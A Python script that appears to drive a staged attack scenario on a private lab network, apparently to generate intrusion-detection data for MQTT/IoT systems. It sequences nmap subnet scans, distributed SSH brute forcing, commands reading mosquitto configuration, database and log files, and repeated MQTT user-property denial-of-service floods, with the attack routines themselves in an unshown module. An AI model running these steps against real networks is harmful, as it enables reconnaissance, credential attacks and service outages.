import apts
import random
import time
import pickle
import pytz
from datetime import datetime
import os


def main():
    iteration = str(int(os.getenv("user_property_ddos_num_it")) + 1)
    os.putenv("user_property_ddos_num_it", iteration)
    experiments_details = []
    access_target = "10.0.0.7"
    attack_name = "user_property_dos"
    start_time_all = datetime.now(tz=pytz.UTC)

    # 1) INITIAL ACCESS
    # ----------------------------------------------------------------------------------------------
    commands = "sudo nmap -sS -T3 -Pn 192.168.1.0/24;sudo nmap -sS -T3  -Pn 192.168.0.0/24;sudo nmap  -sS -T3 -Pn 10.0.0.0/24"
    command_list = commands.split(";")
    experiment = apts.initial_access(access_target, "1.1", command_list, attack_name, "nmap_T3_192_10", iteration,
                                     pause_commands=True,
                                     sup_conclusion_pause=60, sup_interval_pause=5)
    experiments_details.append(experiment)
    time.sleep(random.randint(0, 200))

    # 1) INITIAL ACCESS
    # ----------------------------------------------------------------------------------------------
    experiment = apts.initial_access(access_target, "1.2", command_list, attack_name, "nmap_T3_192_10", iteration,
                                     sup_conclusion_pause=60)
    experiments_details.append(experiment)
    time.sleep(random.randint(0, 200))

    # 1opt) SSH BRUTEFORCE
    # ----------------------------------------------------------------------------------------------
    experiments = apts.brute_force("1.3", attack_name, 10, is_distributed=True)
    experiments_details.append(experiments)

    time.sleep(random.randint(0, 100))

    # 1opt) SSH BRUTEFORCE
    # ----------------------------------------------------------------------------------------------
    experiments = apts.brute_force("1.4", attack_name, 10, is_distributed=True)
    experiments_details.append(experiments)

    time.sleep(random.randint(0, 100))

    # 1opt) SSH BRUTEFORCE
    # ----------------------------------------------------------------------------------------------
    experiments = apts.brute_force("1.5", attack_name, 10, is_distributed=True)
    experiments_details.append(experiments)

    prefix = "10.0.0."
    targets = []
    for i in range(4, 23):
        targets.append(prefix + str(i))

    # 2) MQTT DISCOVERY
    # ---------------------------------------------------------------------------------------------
    commands2 = "cat /etc/mosquitto/mosquitto.conf;cat /etc/mosquitto/conf.d;cat /var/lib/mosquitto/mosquitto.db;cat /var/log/mosquitto/mosquitto.log; cat /var/log/syslog;cat /var/log/syslog;sudo /usr/bin/nmap -sS -T3 -Pn -p 1883,8883 10.0.0.0/24;sudo nmap -sS -T3 -f -Pn -p 1883,8883 --script banner 10.0.0.0/24;sudo nmap -p 1883,8883 --script mqtt-subscribe 10.0.0.0/24"
    command_list2 = commands2.split(";")
    experiments = apts.mqtt_discovery(targets[random.randint(0, len(targets))], "1.6", command_list2, attack_name,
                                      "mqtt_cat_mqtt_sub_nmap_banner", iteration
                                      , pause_commands=True, sup_conclusion_pause=20, interval=5, start_pausing=6,
                                      sup_interval_pause=5)
    experiments_details.append(experiments)
    time.sleep(random.randint(80, 120))

    # 2) MQTT DISCOVERY
    # ---------------------------------------------------------------------------------------------
    experiments = apts.mqtt_discovery(targets[random.randint(0, len(targets))], "1.7", command_list2, attack_name,
                                      "mqtt_cat_mqtt_sub_nmap_banner", iteration,
                                      sup_conclusion_pause=10, pause_commands=True, interval=3, start_pausing=6,
                                      sup_interval_pause=5)
    experiments_details.append(experiments)
    time.sleep(random.randint(80, 120))

    # 3) USER PROPERTIES DOS
    # ---------------------------------------------------------------------------------------------

    experiment = apts.user_property_ddos(targets, "2.1", 20, iteration)
    experiments_details.append(experiment)
    experiment = apts.user_property_ddos(targets, "2.2", 20, iteration)
    experiments_details.append(experiment)
    experiment = apts.user_property_ddos(targets, "2.3", 20, iteration)
    experiments_details.append(experiment)
    experiment = apts.user_property_ddos(targets, "2.4", 40, iteration)
    experiments_details.append(experiment)
    experiment = apts.user_property_ddos(targets, "2.5", 20, iteration)
    experiments_details.append(experiment)
    experiment = apts.user_property_ddos(targets, "2.6", 20, iteration)
    experiments_details.append(experiment)
    experiment = apts.user_property_ddos(targets, "2.7", 40, iteration)
    experiments_details.append(experiment)
    experiment = apts.user_property_ddos(targets, "2.8", 20, iteration)
    experiments_details.append(experiment)
    experiment = apts.user_property_ddos(targets, "2.9", 20, iteration)
    experiments_details.append(experiment)
    experiment = apts.user_property_ddos(targets, "2.10", 40, iteration)
    experiments_details.append(experiment)

    # 2) MQTT DISCOVERY
    # ---------------------------------------------------------------------------------------------
    command_list2 = commands2.split(";")
    experiments = apts.mqtt_discovery(targets, "1.8", command_list2, attack_name, "mqtt_cat_mqtt_sub_nmap_banner",
                                      iteration, pause_commands=True, sup_conclusion_pause=30, interval=1,
                                      start_pausing=5, sup_interval_pause=10)
    experiments_details.append(experiments)

    # 3) USER PROPERTIES DOS
    # ---------------------------------------------------------------------------------------------
    experiment = apts.user_property_ddos(targets, "2.11", 10, iteration)
    experiments_details.append(experiment)
    experiment = apts.user_property_ddos(targets, "2.12", 10, iteration)
    experiments_details.append(experiment)
    experiment = apts.user_property_ddos(targets, "2.13", 20, iteration)
    experiments_details.append(experiment)
    experiment = apts.user_property_ddos(targets, "2.14", 40, iteration)
    experiments_details.append(experiment)
    experiment = apts.user_property_ddos(targets, "2.15", 80, iteration)
    experiments_details.append(experiment)
    experiment = apts.user_property_ddos(targets, "2.16", 80, iteration)
    experiments_details.append(experiment)
    experiment = apts.user_property_ddos(targets, "2.17", 40, iteration)
    experiments_details.append(experiment)
    experiment = apts.user_property_ddos(targets, "2.18", 20, iteration)
    experiments_details.append(experiment)
    experiment = apts.user_property_ddos(targets, "2.19", 10, iteration)
    experiments_details.append(experiment)
    experiment = apts.user_property_ddos(targets, "2.20", 10, iteration)
    experiments_details.append(experiment)

    # 2) MQTT DISCOVERY
    # ---------------------------------------------------------------------------------------------
    command_list2 = commands2.split(";")
    experiments = apts.mqtt_discovery(targets, "1.9", command_list2, attack_name, "mqtt_cat_mqtt_sub_nmap_banner",
                                      iteration, pause_commands=True, sup_conclusion_pause=20, interval=1,
                                      start_pausing=5, sup_interval_pause=15)
    experiments_details.append(experiments)

    # 3) USER PROPERTIES DOS
    # ---------------------------------------------------------------------------------------------
    experiment = apts.user_property_ddos(targets, "2.21", 5, iteration)
    experiments_details.append(experiment)
    experiment = apts.user_property_ddos(targets, "2.22", 10, iteration)
    experiments_details.append(experiment)
    experiment = apts.user_property_ddos(targets, "2.23", 20, iteration)
    experiments_details.append(experiment)
    experiment = apts.user_property_ddos(targets, "2.24", 40, iteration)
    experiments_details.append(experiment)
    experiment = apts.user_property_ddos(targets, "2.25", 10, iteration)
    experiments_details.append(experiment)
    experiment = apts.user_property_ddos(targets, "2.26", 10, iteration)
    experiments_details.append(experiment)
    experiment = apts.user_property_ddos(targets, "2.27", 40, iteration)
    experiments_details.append(experiment)
    experiment = apts.user_property_ddos(targets, "2.28", 20, iteration)
    experiments_details.append(experiment)
    experiment = apts.user_property_ddos(targets, "2.29", 10, iteration)
    experiments_details.append(experiment)
    experiment = apts.user_property_ddos(targets, "2.30", 5, iteration)
    experiments_details.append(experiment)

    print(experiments_details)
    end_time_all = datetime.now(tz=pytz.UTC)
    experiment = {
        "phase_number": 0,
        "attack_name": attack_name,
        "phase_name": "all_steps",
        "start_time": start_time_all,
        "end_time": end_time_all,
        "iteration": iteration
    }
    experiments_details.append(experiment)
    with open('./output/exp_details.pkl', 'wb') as f:
        pickle.dump(experiments_details, f)
    print(experiments_details)


if __name__ == '__main__':
    main()
